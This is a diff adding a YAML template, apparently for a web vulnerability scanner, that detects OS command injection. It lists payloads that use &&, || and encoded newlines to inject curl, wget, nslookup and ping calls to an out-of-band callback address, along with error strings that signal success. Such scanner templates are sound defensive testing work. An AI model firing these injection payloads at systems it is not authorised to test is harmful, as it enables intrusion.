@@ -1,0 +1,36 @@
+id: "command_injection"
+issue_code: "os_cmd_injection"
+detection_condition: "or"
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 100
+  - response_condition:
+      contains: command not found
+      confidence: 70
+  - response_condition:
+      contains: invalid option
+      confidence: 70
+  - response_condition:
+      contains: unknown option
+      confidence: 70
+  - response_condition:
+      contains: "Syntax error:"
+      confidence: 70
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+  - name: test
+    value: "test"
+templates:
+  - "&& curl {{.oob_address}}"
+  - "%0A nslookup {{.oob_address}}"
+  - "%0A ping -c 3 {{.oob_address}}"
+  - "%0A wget {{.oob_address}}"
+  - "%0A curl {{.oob_address}}"
+  - "|| nslookup {{.oob_address}}"
+  - "&& nslookup {{.oob_address}}"
+  - "|| ping -c 3 {{.oob_address}}"
+  - "&& ping -c 3 {{.oob_address}}"
+categories:
+  - command_injection
